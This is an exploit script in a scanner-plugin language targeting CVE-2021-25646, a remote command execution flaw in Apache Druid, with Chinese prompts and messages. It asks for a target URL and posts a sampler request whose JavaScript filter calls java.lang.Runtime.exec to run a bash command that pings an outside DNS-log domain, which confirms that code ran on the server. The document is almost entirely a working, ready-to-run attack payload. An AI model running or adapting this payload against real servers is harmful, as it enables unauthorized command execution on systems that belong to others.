#define dir = /druid/indexer/v1/sampler
#define post = {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2020-12-12T12:10:21.040Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 ping dnslog')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
#define info = CVE-2021-25646 Apache Druid远程命令执行漏洞
#include ATTACKUTILS/dns.wker

function main(args){
	print("请输入要检测的网址： ");
	url = input();
	try{
		dnsC = GetDomain();
		realpost = StrReplace(post,"dnslog",dnsC[0]);
		HttpPost(url.dir,realpost,"Content-Type: application/json;charset=utf-8".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
		printclolor("[+] 存在CVE-2021-25646 Apache Druid远程命令执行漏洞！",3);
		print("所使用的DNSLog: ".dnsC[0]);
		print("DNSLog结果：".DnsRef(dnsC[1]));
	}catch{
		printclolor("[-] 请检查目标状态！",5);
	}
}
